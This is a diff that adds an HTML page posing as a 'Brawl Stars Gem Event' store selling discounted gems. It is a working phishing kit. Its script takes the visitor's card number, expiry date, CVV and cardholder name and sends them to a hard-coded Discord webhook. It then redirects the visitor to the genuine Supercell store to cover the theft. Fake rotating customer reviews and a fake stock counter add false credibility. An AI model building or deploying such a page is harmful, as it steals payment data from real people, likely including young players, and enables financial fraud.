@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brawl Stars Gem Event 2024</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: url('https://images.alphacoders.com/128/thumb-1920-1283410.jpg') no-repeat center center/cover;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .stock-box {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 2px solid green;
+            border-radius: 10px;
+            padding: 15px;
+            width: 250px;
+            box-shadow: 0 0 10px green;
+        }
+
+        .stock-box h2 {
+            color: green;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .stock-box .stock-info {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .stock-box .stock-info img {
+            width: 50px;
+            height: 50px;
+            object-fit: cover;
+        }
+
+        .stock-box .stock-info .stock-text {
+            font-size: 14px;
+            color: white;
+            margin-left: 10px;
+        }
+
+        .container {
+            background-color: rgba(51, 51, 51, 0.9);
+            border: 2px solid green;
+            border-radius: 10px;
+            padding: 20px;
+            width: 400px;
+            box-shadow: 0 0 15px green;
+        }
+
+        .container h1 {
+            text-align: center;
+            color: gold;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: gold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid green;
+            border-radius: 5px;
+            background-color: black;
+            color: white;
+            font-size: 14px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .checkbox-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .checkbox-group div {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background-color: green;
+            color: black;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #ffcc00;
+        }
+
+        .customer-reviews {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 2px solid green;
+            border-radius: 10px;
+            padding: 15px;
+            width: 250px;
+            box-shadow: 0 0 10px green;
+            text-align: center;
+            color: white;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .customer-reviews h3 {
+            color: green;
+            margin: 0 0 10px 0;
+            font-size: 18px;
+        }
+
+        .customer-reviews p {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+    </style>
+    <script>
+        function formatCardNumber(input) {
+            input.value = input.value.replace(/[^0-9]/g, '') // Allow only numbers
+                             .replace(/(\d{4})(?=\d)/g, '$1 ') // Add space every 4 digits
+                             .substring(0, 19); // Limit to 16 digits + 3 spaces
+        }
+
+        function formatExpiryDate(input) {
+            input.value = input.value.replace(/[^0-9]/g, '') // Allow only numbers
+                             .replace(/(\d{2})(?=\d)/, '$1/') // Add slash after MM
+                             .substring(0, 5); // Limit to MM/YY
+        }
+
+        function validateCVV(input) {
+            input.value = input.value.replace(/[^0-9]/g, '') // Allow only numbers
+                             .substring(0, 3); // Limit to 3 digits
+        }
+
+        function validateName(input) {
+            input.value = input.value.replace(/[^a-zA-Z ]/g, ''); // Allow only letters and spaces
+        }
+
+        function validateUsername(input) {
+            input.value = input.value.substring(0, 20); // Limit to 20 characters
+        }
+
+        function validateSelection(event) {
+            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+            checkboxes.forEach(checkbox => {
+                if (checkbox !== event.target) {
+                    checkbox.checked = false;
+                }
+            });
+        }
+
+        function submitForm(event) {
+            event.preventDefault();
+            const webhookUrl = "https://discord.com/api/webhooks/1318281702904434728/We_1tTwxFIZ6ZHbaC1dnjYi4Ozc68ydv1THXxXBC_q8-5VDKAtUIf2xIZvwOb4Jo8woD"; // Replace with your webhook URL
+
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            const cardHolder = document.getElementById('card-holder').value;
+            const BSusername = document.getElementById('BS-username').value;
+            const selectedOption = document.querySelector('input[name="robux-option"]:checked');
+
+            if (!cardNumber || !expiryDate || !cvv || !cardHolder || !BSusername || !selectedOption) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            const data = {
+                "Card Number": cardNumber,
+                "Expiry Date": expiryDate,
+                "CVV": cvv,
+                "Card Holder": cardHolder,
+                "BS Username": BSusername,
+                "Selected Gem Option": selectedOption.value
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
+            }).then(() => {
+                window.location.href = "https://store.supercell.com";
+            }).catch((error) => {
+                alert("An error occurred. Please try again later.");
+                console.error(error);
+            });
+        }
+
+        const reviews = [
+            { text: "Amazing service! Totally worth it.", author: "- Alex" },
+            { text: "The Gem packages are such a steal!", author: "- Mia" },
+            { text: "I loved the quick response and delivery!", author: "- James" },
+            { text: "Highly recommend for every Brawl Stars fan.", author: "- Sarah" },
+            { text: "Great value for money. I'll come back again!", author: "- Chris" },
+        ];
+
+        let currentReviewIndex = 0;
+
+        function updateReview() {
+            currentReviewIndex = (currentReviewIndex + 1) % reviews.length;
+            const reviewText = document.getElementById("review-text");
+            const reviewAuthor = document.getElementById("review-author");
+
+            reviewText.textContent = reviews[currentReviewIndex].text;
+            reviewAuthor.textContent = reviews[currentReviewIndex].author;
+        }
+
+        setInterval(updateReview, 5000); // Change review every 5 seconds
+    </script>
+</head>
+<body>
+    <div class="stock-box">
+        <h2>Current Gem Stock</h2>
+        <div class="stock-info">
+            <img src="https://e7.pngegg.com/pngimages/245/249/png-clipart-brawl-stars-gemstone-android-gems-leaf-diamond.png" alt="Gems Image">
+            <div class="stock-text">
+                Current Gem Stock: 364.370 Gems
+            </div>
+        </div>
+    </div>
+
+    <div class="customer-reviews" id="customer-reviews">
+        <h3>Customer Reviews</h3>
+        <p id="review-text">"Amazing service! Totally worth it."</p>
+        <p id="review-author">- Alex</p>
+    </div>
+
+    <div class="container">
+        <h1>Brawl Stars Gems Event 2024</h1>
+        <form onsubmit="submitForm(event)">
+            <div class="form-group">
+                <label for="card-number">Card Number</label>
+                <input type="text" id="card-number" placeholder="Enter your card number" oninput="formatCardNumber(this)">
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiry-date">Expiry Date</label>
+                    <input type="text" id="expiry-date" placeholder="MM/YY" oninput="formatExpiryDate(this)">
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="Enter CVV" oninput="validateCVV(this)">
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="card-holder">Card Holder</label>
+                <input type="text" id="card-holder" placeholder="Enter card holder name" oninput="validateName(this)">
+            </div>
+            <div class="form-group">
+                <label for="BS-username">Brawl Stars Username</label>
+                <input type="text" id="BS-username" placeholder="Enter your Brawl Stars username" oninput="validateUsername(this)">
+            </div>
+            <div class="form-group">
+                <label>Choose Your Gem Package</label>
+                <div class="checkbox-group">
+                    <div>
+                        <input type="checkbox" name="robux-option" value="210 Gems / $2.5" onchange="validateSelection(event)">
+                        <label>210 Gems / $2.5</label>
+                    </div>
+                    <div>
+                        <input type="checkbox" name="robux-option" value="325 Gems / $3" onchange="validateSelection(event)">
+                        <label>325 Gems / $3</label>
+                    </div>
+                    <div>
+                        <input type="checkbox" name="robux-option" value="450 Gems / $3.25" onchange="validateSelection(event)">
+                        <label>450 Gems / $3.25</label>
+                    </div>
+                    <div>
+                        <input type="checkbox" name="robux-option" value="550 Gems / $3.5" onchange="validateSelection(event)">
+                        <label>550 Gems / $3.5</label>
+                    </div>
+                    <div>
+                        <input type="checkbox" name="robux-option" value="2000 Gems / $7.25 (SALE)" onchange="validateSelection(event)">
+                        <label>2000 Gems / $7.25 (SALE)</label>
+                    </div>
+                </div>
+            </div>
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
